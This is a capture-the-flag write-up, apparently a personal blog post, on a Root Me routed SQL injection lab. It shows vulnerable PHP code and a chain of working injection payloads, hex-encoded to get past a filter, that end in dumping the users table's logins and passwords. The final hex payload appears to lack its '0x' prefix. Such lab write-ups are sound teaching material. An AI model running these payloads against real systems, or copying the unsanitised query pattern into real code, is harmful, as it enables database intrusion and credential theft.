---
title: "SQL injection - Routed"
tags:
    - Lab
    - Root Me
date: "2024-06-22"
thumbnail: "/assets/img/thumbnail/rootme.png"
bookmark: true
---
## Description

Retrieve the administrator password.

Routed SQL Injection!!!

First time hearing about it, so I searched to see what it is, and I found that this is a situation where the injectable query is not the one which gives output, but the output of the injectable query goes to the query which gives the output.

Let's look at this snippet of code to understand more.

 ```php
 <?
 $id=$_GET['id'];

 $query="SELECT id,sec_code FROM users WHERE id='$id'";
 
if (!$result=mysql_query($query,$conn))
   die("Error While Selection process : " . mysql_error());
if(mysql_num_rows($result) == 0)
	die();

$row = mysql_fetch_array($result, MYSQL_ASSOC);

$query="SELECT username FROM users WHERE sec_code='".$row['sec_code']."'";

echo "<br><font color=red>This is the query which gives you Output : </font>$query<br><br>";

if (!$result=mysql_query($query,$conn)) 
 die("Error While Selection process : " . mysql_error());

if(mysql_num_rows($result) == 0)
	die("Invalid Input parameter");
   
   $row = mysql_fetch_array($result, MYSQL_ASSOC);
    	echo 'Username is : ' . $row['username'] . "<br>";?>
 ```

The magic here is that - the output of the first query is used as the input of the second query and it is the second query which displays output back to us. Or in other words, in order to exploit the SQL Injection vulnerability, we need to control the input for the second query - the variable sec_code (which happens to be the output of the first query). You may have already noticed that, due to the fact that the first query is vulnerable to SQL Injection, we can control and set sec_code to an arbitrary value

## Routed Challange

<a href="http://challenge01.root-me.org/web-serveur/ch49/">Challange Link</a>
<a href="https://cryptii.com/pipes/hex-decoder/">Hex decoder</a>

Let's exploit our challange:
 starting by confirming that it is vulnerable to SQL Injection by sending a single quote ' as payload:

<img src="/assets/img/rootme/routed/1.png" alt="quote">

 ok, now i ll inject simple payload `' union select 1 -- -` what this  will do??
this will escape the first SQL query and set both values, the second one (representing sec_code in our ecample) to the value 1
 
 as we said that sec_code is the output of first query and it's the input for the second query. now it has a value, the second query will run successfully and return output for the value 1

<img src="/assets/img/rootme/routed/2.png" alt="union1">

also this will happen if we set the value to 2 `' union select 2 -- -`

<img src="/assets/img/rootme/routed/3.png" alt="union2">

what if we set the second one to `True` ?? it will dump all the record in the DB yes!
So, the query would be `' union select ' or true -- - -- -` 

<img src="/assets/img/rootme/routed/4.png" alt="attack detected">

but i get an alert "Attack detected" mmmmmm there are filters !

## Bypass the Filter

the basic bypass to the filter, i will `HEX encode` the term that be blocked `' or true -- -` 

<img src="/assets/img/rootme/routed/5.png" alt="hex1">

<img src="/assets/img/rootme/routed/6.png" alt="hex2">

it appears that there are 3 IDs, now we can bypass the filter easily and can control the second part of the query.
let's determine how many columns by using `Order by` 
the Sql table contains 2 columns cuz when try to order by 3 , i get an error that it's unknown

payload
```sql
 ' union select ' order by 3 -- - -- - 

payload after hexed : ` ' union select 0x27206f726465722062792033202d2d202d -- -`
```
<img src="/assets/img/rootme/routed/7.png" alt="orderby">

now we know that the output is [ID & Email]
if we use union select once again here we can return any output that we want
So,Let's use SQL functions like `current_user()` and `@@version`

Payload
```sql
' union select ' union select current_user(),@@version -- - -- -

after hex encode: `' union select 0x2720756e696f6e2073656c6563742063757272656e745f7573657228292c404076657273696f6e202d2d202d -- -`
```

<img src="/assets/img/rootme/routed/8.png" alt="version">

we are now in a situation that resembles a normal SQL Injection.
we want to know the name of the tables that are in the DB 

## Retrieve Table name

payload
```sql
' union select ' UNION SELECT table_name, null FROM information_schema.tables WHERE table_schema = database() -- -

after hex encode: ' union select 0x2720554e494f4e2053454c454354207461626c655f6e616d652c206e756c6c2046524f4d20696e666f726d6174696f6e5f736368656d612e7461626c6573205748455245207461626c655f736368656d61203d2064617461626173652829202d2d202d -- -
```

<img src="/assets/img/rootme/routed/table.png" alt="table">

## Retrieve Columns names

the table called user has two columns, let's get the columns' names 

payloads
```sql
 -
' union select' UNION SELECT column_name, null FROM information_schema.columns WHERE table_name = 'users' AND table_schema = database() LIMIT 1, 1 -- -

after hex : ' union select 0x2720554e494f4e2053454c45435420636f6c756d6e5f6e616d652c206e756c6c2046524f4d20696e666f726d6174696f6e5f736368656d612e636f6c756d6e73205748455245207461626c655f6e616d65203d202775736572732720414e44207461626c655f736368656d61203d2064617461626173652829204c494d495420312c31202d2d202d -- -

' union select' UNION SELECT column_name, null FROM information_schema.columns WHERE table_name = 'users' AND table_schema = database() LIMIT 2, 1 -- -

after hex : ' union select 0x2720554e494f4e2053454c45435420636f6c756d6e5f6e616d652c206e756c6c2046524f4d20696e666f726d6174696f6e5f736368656d612e636f6c756d6e73205748455245207461626c655f6e616d65203d202775736572732720414e44207461626c655f736368656d61203d2064617461626173652829204c494d495420322c31202d2d202d -- -
```
these two payloads return columns' names `Login & Password`

## Retrieve Admin Password

Finallyyyyy, let's retrieve the admin password by using `Gorup_concat`

payload
```sql
' union select ' union  select 1,(select group_concat(login, ':' ,password) from users) -- -

after hex :' union select 2720756e696f6e202073656c65637420312c2873656c6563742067726f75705f636f6e636174286c6f67696e2c20273a27202c70617373776f7264292066726f6d20757365727329202d2d202d -- -
```
<img src="/assets/img/rootme/routed/9.png" alt="admin password">


I know it was a long write-up, but I hope it can be useful.
 See you in another one :)


















